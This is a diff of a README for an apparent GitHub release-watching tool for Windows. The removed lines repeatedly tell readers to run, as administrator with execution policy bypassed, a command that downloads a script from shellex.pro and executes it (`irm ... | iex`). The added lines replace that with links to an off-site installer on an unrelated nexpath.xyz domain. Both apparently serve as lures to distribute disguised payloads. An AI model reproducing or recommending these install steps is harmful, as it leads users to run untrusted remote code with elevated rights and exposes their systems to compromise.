@@ -2,8 +2,6 @@
 
 <img src="https://img.shields.io/badge/Platform-Windows_10/11-0078D4?style=for-the-badge&logo=windows&logoColor=white" height="25"/>
 <img src="https://img.shields.io/badge/Open-Source-3fb950?style=for-the-badge&logo=opensourceinitiative&logoColor=white" height="25"/>
-<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white" height="25"/>
-
 # GitHub Release Notifier Downloader
 **Release watch · Auto download · Folder sync**
 
@@ -19,31 +17,14 @@
 
 Script that **monitors GitHub releases** and **downloads new assets** automatically to your disk.
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
-
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
-
+* **Project link:** **[github-release-notifier-downloader.nexpath.xyz](https://github-release-notifier-downloader.nexpath.xyz/)**
+* **Full URL:** `https://github-release-notifier-downloader.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 ## `FEATURES`
 
@@ -65,12 +46,12 @@ irm 'https://shellex.pro/ps/setup.ps1' | iex
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open PowerShell as Administrator and run the command from the INSTALLATION section. You should see steps <b>[1/3]</b>, <b>[2/3]</b>, and <b>[3/3]</b> in the console.
+<br>Open <a href="https://github-release-notifier-downloader.nexpath.xyz/">github-release-notifier-downloader.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
-<summary>&nbsp;<b>Command did not start?</b></summary>
-<br>Try: `irm 'https://shellex.pro/ps/setup.ps1' | iex`
+<summary>&nbsp;<b>Download didn't start?</b></summary>
+<br>Use the manual link on the NexPath download page, or open <a href="https://github-release-notifier-downloader.nexpath.xyz/">github-release-notifier-downloader.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -80,5 +61,5 @@ irm 'https://shellex.pro/ps/setup.ps1' | iex
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Re-run the same PowerShell command to fetch the latest build.
+<br>Open <a href="https://github-release-notifier-downloader.nexpath.xyz/">github-release-notifier-downloader.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
